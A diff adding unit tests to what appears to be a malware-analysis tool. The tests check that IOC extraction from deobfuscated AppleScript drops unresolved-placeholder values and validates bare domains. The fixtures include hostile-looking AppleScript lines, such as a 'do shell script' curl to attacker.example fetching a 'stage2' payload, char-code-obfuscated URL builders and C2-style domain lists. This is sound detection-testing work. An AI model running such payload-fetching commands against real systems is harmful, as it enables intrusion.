@@ -549,9 +549,10 @@ test('applescript-obfuscation: sink candidate promotes to high+ severity with UR
 // ── Binding-table static helper on the renderer ────────────────────────────
 
 const osCtx = loadModules([
+  'vendor/tldts.min.js',
   'src/constants.js',
   'src/renderers/osascript-renderer.js',
-], { expose: ['OsascriptRenderer'] });
+], { expose: ['OsascriptRenderer', 'pushIOC', 'pushBareDomain', 'IOC'] });
 const { OsascriptRenderer } = osCtx;
 
 test('OsascriptRenderer._reassembleCharCodeChains: resolves AS1 anon chain', () => {
@@ -1086,4 +1087,301 @@ test('applescript-obfuscation: Tier B skips when handler has multiple `set X to 
   const fileScope = pick(cands, c => c._assignedTo === '_X' && !c._handlerScoped);
   assert.equal(fileScope.length, 0,
     `multi-assignment handler must skip Tier B promotion; got: ${JSON.stringify(host(cands))}`);
+});
+
+// ── Unresolved-sentinel rejection at IOC-emission ──────────────────────────
+//
+// Partially-resolved cleartext carries `⟨unresolved:NAME⟩` (U+27E8 /
+// U+27E9) placeholders for operands the resolver couldn't substitute.
+// These markers are load-bearing in the Deobfuscation viewer — the
+// analyst needs to see WHICH slot is unknown — but they must never
+// reach IOC buckets. A URL like `https://⟨unresolved:__iunw9unf⟩/` is
+// not a real pivot and pollutes the sidebar, Summary, STIX and MISP
+// exports. `hasUnresolvedSentinel()` is the canonical gate; see
+// `src/constants.js` for the rationale.
+
+test('applescript-obfuscation: sentinel-bearing URL does not escape into IOC.URL via _extractIOCsFromDecoded', () => {
+  // Direct exercise of the innermost gate. Feed bytes that contain a
+  // reassembled `do shell script` line with a partially-resolved URL
+  // carrying a U+27E8/U+27E9 sentinel — the extractor must emit NO
+  // IOC.URL row (the host-sanity filter would reject a bare sentinel
+  // host, but a real-host-plus-sentinel-path construction would
+  // otherwise slip through the regex character class).
+  const payload = 'do shell script "curl https://\u27E8unresolved:__iunw9unf\u27E9/ && '
+                + 'curl https://attacker.example/\u27E8unresolved:_path\u27E9/stage2"';
+  const bytes = new TextEncoder().encode(payload);
+  const iocs = d._extractIOCsFromDecoded(bytes);
+  for (const i of iocs) {
+    assert.ok(!/\u27E8|\u27E9/.test(i.url),
+      `no sentinel may reach IOC buckets; leaked: ${JSON.stringify(i)}`);
+  }
+});
+
+test('applescript-obfuscation: partial resolution Tier C — dynamicFetchUrls skips sentinel-bearing URLs', () => {
+  // Tier C: `set _Var to do shell script <chain>` extracts URLs from
+  // the resolved command as `_patternIocs` labels. When the chain is
+  // only partially resolved, any URL that still contains a sentinel
+  // must be skipped — the runtime-fetch URL is unknown, so surfacing
+  // `Dynamic C2 discovery … — https://⟨unresolved:_X⟩/` is misleading.
+  const text =
+    `property _Other1 : "x"\n` +
+    `property _Other2 : "y"\n` +
+    // Builds `https://` static prefix + unresolved `_Runtime` + `/`.
+    // Assignment to `_Fetched` makes this a Tier C candidate.
+    `set _Fetched to do shell script ((ASCII character 104) & (ASCII character 116) & (ASCII character 116) & (ASCII character 112) & (ASCII character 115) & ":" & (ASCII character 47) & (ASCII character 47)) & _Runtime & (ASCII character 47)`;
+  const cands = d._findAppleScriptObfuscationCandidates(text, {});
+  // Inspect every candidate's _patternIocs / _dynamicFetchUrls — none
+  // may contain a sentinel character.
+  for (const c of host(cands)) {
+    const pats = Array.isArray(c._patternIocs) ? c._patternIocs : [];
+    for (const p of pats) {
+      assert.ok(!/\u27E8|\u27E9/.test(p.url || ''),
+        `_patternIocs label leaked sentinel; got: ${JSON.stringify(p)}`);
+    }
+    const dyn = Array.isArray(c._dynamicFetchUrls) ? c._dynamicFetchUrls : [];
+    for (const u of dyn) {
+      assert.ok(!/\u27E8|\u27E9/.test(u),
+        `_dynamicFetchUrls entry leaked sentinel; got: ${u}`);
+    }
+  }
+});
+
+test('applescript-obfuscation: partially-reassembled shell command with sentinel URL — no IOC.URL emitted', async () => {
+  // End-to-end via `_processCommandObfuscation` — the full pipeline
+  // that the host uses. `_X` resolves to
+  // `"https://⟨unresolved:_Runtime⟩/"` (static prefix known, runtime
+  // host unknown); a sink referencing `_X` propagates the partial
+  // resolution. Emitted IOCs must NOT carry the sentinel chars.
+  const text =
+    `property _Other1 : "x"\n` +
+    `property _Other2 : "y"\n` +
+    `set _X to ((ASCII character 104) & (ASCII character 116) & (ASCII character 116) & (ASCII character 112) & (ASCII character 115) & ":" & (ASCII character 47) & (ASCII character 47)) & _Runtime & (ASCII character 47)\n` +
+    `do shell script _X`;
+  const cands = d._findAppleScriptObfuscationCandidates(text, {});
+  const sink = pick(cands, c => /Partially-Reassembled/.test(c.technique || ''));
+  assert.ok(sink.length >= 1, `expected partially-reassembled sink; got: ${JSON.stringify(host(cands))}`);
+  // Confirm the sentinel is present on _resolvedValue (preserves
+  // analyst-visible uncertainty signal in the Deobfuscation card).
+  assert.ok(sink[0]._resolvedValue.includes('\u27E8unresolved:_Runtime\u27E9'),
+    `_resolvedValue must retain sentinel; got: ${sink[0]._resolvedValue}`);
+  // Now run through the post-processor — the emitted IOCs must NOT.
+  const finding = await d._processCommandObfuscation(sink[0]);
+  assert.ok(finding, 'expected post-processor to return a finding');
+  const leaky = (finding.iocs || []).filter(i => /\u27E8|\u27E9/.test(i.url || ''));
+  assert.equal(leaky.length, 0,
+    `no finding.iocs row may carry a sentinel; leaked: ${JSON.stringify(leaky)}`);
+});
+
+// ── pushIOC sentinel gate (canonical chokepoint) ───────────────────────────
+//
+// Every IOC row that reaches `findings.interestingStrings` /
+// `findings.externalRefs` funnels through `pushIOC()`. A gate there
+// catches every caller — renderer raw-URL regexes (osascript, plist),
+// decoder post-processors, the reassembler novelIocs loop, the
+// `_mergeEncodedFindingIocs` chokepoint. This is the last-line defence
+// against sentinel-bearing values (`⟨unresolved:NAME⟩`,
+// `⟨VAR:~start,len⟩`, `⟨…⟩` — U+27E8 / U+27E9).
+//
+// The specific leak that prompted this gate: clicking "Load stitched
+// script" on a reassembled AppleScript opens a synthetic
+// `.reassembled.<hash>.<ext>` file whose text contains decoder-embedded
+// sentinels. The child load routes to `OsascriptRenderer` via
+// `_sniffAppleScript`, and the renderer's own URL regex
+// (`/https?:\/\/[^\s"'<>\])}]{6,200}/gi`) captures the sentinel URL and
+// funnels it straight through `pushIOC` at medium severity — bypassing
+// every gate that lived at the decoded-bytes / extractor / merge layers.
+
+test('pushIOC: rejects IOC.URL with ⟨unresolved:…⟩ sentinel', () => {
+  const { pushIOC, IOC } = osCtx;
+  const findings = { interestingStrings: [], externalRefs: [] };
+  pushIOC(findings, {
+    type: IOC.URL,
+    value: 'https://\u27E8unresolved:__cViNLHc\u27E9/',
+    severity: 'medium',
+    bucket: 'externalRefs',
+  });
+  assert.equal(findings.externalRefs.length, 0,
+    `sentinel URL must be dropped; got: ${JSON.stringify(host(findings.externalRefs))}`);
+  assert.equal(findings.interestingStrings.length, 0,
+    'sentinel URL must not land in any bucket');
+});
+
+test('pushIOC: rejects any IOC type carrying ⟨…⟩ sentinel', () => {
+  const { pushIOC, IOC } = osCtx;
+  const findings = { interestingStrings: [], externalRefs: [] };
+  const cases = [
+    { type: IOC.URL,       value: 'https://\u27E8VAR:~0,3\u27E9.example/' },
+    { type: IOC.IP,        value: '\u27E8VAR:~0,3\u27E9.1.2.3' },
+    { type: IOC.FILE_PATH, value: 'C:\\Users\\\u27E8unresolved:_U\u27E9\\x.exe' },
+    { type: IOC.EMAIL,     value: 'user@\u27E8unresolved:_Domain\u27E9' },
+    { type: IOC.PATTERN,   value: 'Dynamic C2 \u2014 https://\u27E8unresolved:_X\u27E9/' },
+  ];
+  for (const c of cases) {
+    pushIOC(findings, { type: c.type, value: c.value, severity: 'medium' });
+  }
+  const all = [...findings.interestingStrings, ...findings.externalRefs];
+  assert.equal(all.length, 0,
+    `no sentinel-bearing IOC may land via pushIOC; got: ${JSON.stringify(host(all))}`);
+});
+
+test('pushIOC: clean values still land (gate does not over-filter)', () => {
+  const { pushIOC, IOC } = osCtx;
+  const findings = { interestingStrings: [], externalRefs: [] };
+  pushIOC(findings, {
+    type: IOC.URL,
+    value: 'https://clean.example/path',
+    severity: 'medium',
+    bucket: 'externalRefs',
+  });
+  assert.ok(findings.externalRefs.some(r => r.url === 'https://clean.example/path'),
+    `clean URL must pass the gate; got: ${JSON.stringify(host(findings.externalRefs))}`);
+});
+
+test('OsascriptRenderer: analyzeForSecurity drops sentinel-bearing URLs from raw regex scan', () => {
+  // The reproduction of the user-reported leak: a reassembled-script
+  // child file whose content contains a partially-resolved URL. The
+  // renderer's raw URL regex at line ~692 of osascript-renderer.js has
+  // no sentinel filter of its own, but pushIOC (which it funnels
+  // through) does. Assert no sentinel IOC.URL row survives.
+  const text =
+    'on __run()\n' +
+    '    set __WACaHqJOA0 to "https://\u27E8unresolved:__cViNLHc\u27E9/"\n' +
+    '    set _good to "https://clean.example.com/stage2"\n' +
+    '    do shell script ("curl " & __WACaHqJOA0)\n' +
+    '    do shell script ("curl " & _good)\n' +
+    'end __run';
+  const bytes = new TextEncoder().encode(text);
+  const buffer = bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength);
+  const renderer = new OsascriptRenderer();
+  const findings = renderer.analyzeForSecurity(buffer, 'malicious.reassembled.abc123.txt');
+  const allIocs = [
+    ...((findings.externalRefs || [])),
+    ...((findings.interestingStrings || [])),
+  ];
+  for (const r of allIocs) {
+    assert.ok(!/\u27E8|\u27E9/.test(r.url || r.value || ''),
+      `no IOC row may carry a sentinel; leaked: ${JSON.stringify(host([r]))}`);
+  }
+  // Clean URL must still land so we know the renderer did run its
+  // URL scan and the gate wasn't over-filtering.
+  const urls = allIocs.filter(r => (r.url || r.value) === 'https://clean.example.com/stage2');
+  assert.ok(urls.length >= 1,
+    `clean URL must still be extracted; got allIocs: ${JSON.stringify(host(allIocs))}`);
+});
+
+// ── Bare-domain extraction via tldts (widened TLD coverage) ────────────────
+//
+// The osascript / plist bare-domain regex historically hardcoded a
+// 13-TLD whitelist (`com|net|org|io|xyz|info|biz|ru|cn|tk|top|cc|pw`).
+// That missed every other public TLD — notably `.pro`, `.lol`, `.app`,
+// `.dev`, `.shop`, `.online`, `.site`, `.me`, `.co`, country TLDs,
+// new-gTLDs, etc. Reassembled AppleScript payloads often embed C2
+// domains in list literals like `{"9sxgrev.pro", "axj0tw9.lol"}` that
+// were silently dropped.
+//
+// The fix replaces the TLD whitelist with a loose 2–6 label dotted
+// regex + tldts validation inside `pushBareDomain`. tldts's
+// `isIcann === true` accepts every legitimate public suffix and
+// rejects filenames / version strings / invalid TLDs.
+
+test('OsascriptRenderer: bare-domain extraction surfaces .pro / .lol / .app / .dev / .online', () => {
+  const text =
+    'property _list : {"9sxgrev.pro", "axj0tw9.lol", "jnoaxfwe.info", "attacker.app", "c2.dev", "phish.online"}\n' +
+    'do shell script "ping foo"';
+  const bytes = new TextEncoder().encode(text);
+  const buffer = bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength);
+  const renderer = new OsascriptRenderer();
+  const findings = renderer.analyzeForSecurity(buffer, 'test.applescript');
+  const domains = (findings.externalRefs || [])
+    .filter(r => r.type === osCtx.IOC.DOMAIN)
+    .map(r => r.url.toLowerCase());
+  for (const d of ['9sxgrev.pro', 'axj0tw9.lol', 'jnoaxfwe.info', 'attacker.app', 'c2.dev', 'phish.online']) {
+    assert.ok(domains.includes(d),
+      `expected domain ${d} in extracted IOCs; got: ${JSON.stringify(domains)}`);
+  }
+});
+
+test('OsascriptRenderer: bare-domain extraction rejects version strings / invalid TLDs', () => {
+  // tldts-backed validation rejects non-ICANN dotted identifiers even
+  // though the looser regex matches their shape. Note: single-label
+  // extensions that happen to be real ccTLDs (`.py` for Paraguay, `.sh`
+  // for Saint Helena, `.io` for British Indian Ocean Territory) are
+  // legitimately ICANN-assigned and will be accepted — this is the
+  // cost of not maintaining a manual filename-vs-domain disambiguator.
+  // The analyst can filter the sidebar if their corpus happens to
+  // contain `main.py` / `script.sh` / etc.
+  const text =
+    'property _ver : "build.1.2.3"\n' +
+    'property _nope : "thing.xyzzy"\n' +
+    'property _num : "192.168.0.1"';
+  const bytes = new TextEncoder().encode(text);
+  const buffer = bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength);
+  const renderer = new OsascriptRenderer();
+  const findings = renderer.analyzeForSecurity(buffer, 'test.applescript');
+  const domains = (findings.externalRefs || [])
+    .filter(r => r.type === osCtx.IOC.DOMAIN)
+    .map(r => r.url.toLowerCase());
+  for (const bogus of ['build.1.2.3', '192.168.0.1']) {
+    assert.ok(!domains.includes(bogus),
+      `${bogus} must not be emitted as IOC.DOMAIN; got: ${JSON.stringify(domains)}`);
+  }
+  assert.ok(!domains.some(d => d.endsWith('.xyzzy')),
+    `invalid TLD (.xyzzy) must be rejected; got: ${JSON.stringify(domains)}`);
+});
+
+test('pushBareDomain: mirrors abuse-suffix PATTERN flagging (emitUrlSiblings parity)', () => {
+  const { pushBareDomain } = osCtx;
+  const findings = { externalRefs: [] };
+  pushBareDomain(findings, 'c2host.ngrok.io', { bucket: 'externalRefs' });
+  const patterns = findings.externalRefs.filter(r => r.type === osCtx.IOC.PATTERN);
+  assert.ok(patterns.some(r => /abuse-prone/.test(r.url || '')),
+    `abuse-suffix PATTERN must fire for ngrok.io; got: ${JSON.stringify(host(patterns))}`);
+});
+
+test('pushBareDomain: mirrors punycode PATTERN flagging', () => {
+  const { pushBareDomain } = osCtx;
+  const findings = { externalRefs: [] };
+  // xn--fsq.com == 北.com (Chinese for "north") — IDN/punycode.
+  pushBareDomain(findings, 'xn--fsq.com', { bucket: 'externalRefs' });
+  const patterns = findings.externalRefs.filter(r => r.type === osCtx.IOC.PATTERN);
+  assert.ok(patterns.some(r => /Punycode\/IDN/.test(r.url || '')),
+    `punycode PATTERN must fire; got: ${JSON.stringify(host(patterns))}`);
+});
+
+test('pushBareDomain: rejects sentinel-bearing domain', () => {
+  const { pushBareDomain } = osCtx;
+  const findings = { externalRefs: [] };
+  const ret = pushBareDomain(findings, '\u27E8unresolved:_X\u27E9.example.com',
+    { bucket: 'externalRefs' });
+  assert.equal(ret, false);
+  assert.equal(findings.externalRefs.length, 0);
+});
+
+test('pushBareDomain: dedupes repeat pushes of the same registrable domain', () => {
+  const { pushBareDomain } = osCtx;
+  const findings = { externalRefs: [] };
+  // Three subdomains of the same registrable domain — tldts collapses
+  // to `example.pro` so all three push into the same row.
+  pushBareDomain(findings, 'a.example.pro', { bucket: 'externalRefs' });
+  pushBareDomain(findings, 'b.example.pro', { bucket: 'externalRefs' });
+  pushBareDomain(findings, 'example.pro',   { bucket: 'externalRefs' });
+  const domains = findings.externalRefs.filter(r => r.type === osCtx.IOC.DOMAIN);
+  assert.equal(domains.length, 1, `expected exactly one DOMAIN row; got: ${JSON.stringify(host(domains))}`);
+  assert.equal(domains[0].url, 'example.pro');
+});
+
+test('pushBareDomain: accepts clean .pro / .lol domain (the user-reported case)', () => {
+  const { pushBareDomain, IOC } = osCtx;
+  const findings = { externalRefs: [] };
+  for (const d of ['9sxgrev.pro', 'axj0tw9.lol']) {
+    const ret = pushBareDomain(findings, d, { bucket: 'externalRefs', severity: 'info' });
+    assert.equal(ret, true, `expected ${d} to push; returned: ${ret}`);
+  }
+  const domains = findings.externalRefs
+    .filter(r => r.type === IOC.DOMAIN)
+    .map(r => r.url);
+  assert.ok(domains.includes('9sxgrev.pro'),
+    `expected 9sxgrev.pro; got: ${JSON.stringify(domains)}`);
+  assert.ok(domains.includes('axj0tw9.lol'),
+    `expected axj0tw9.lol; got: ${JSON.stringify(domains)}`);
 });
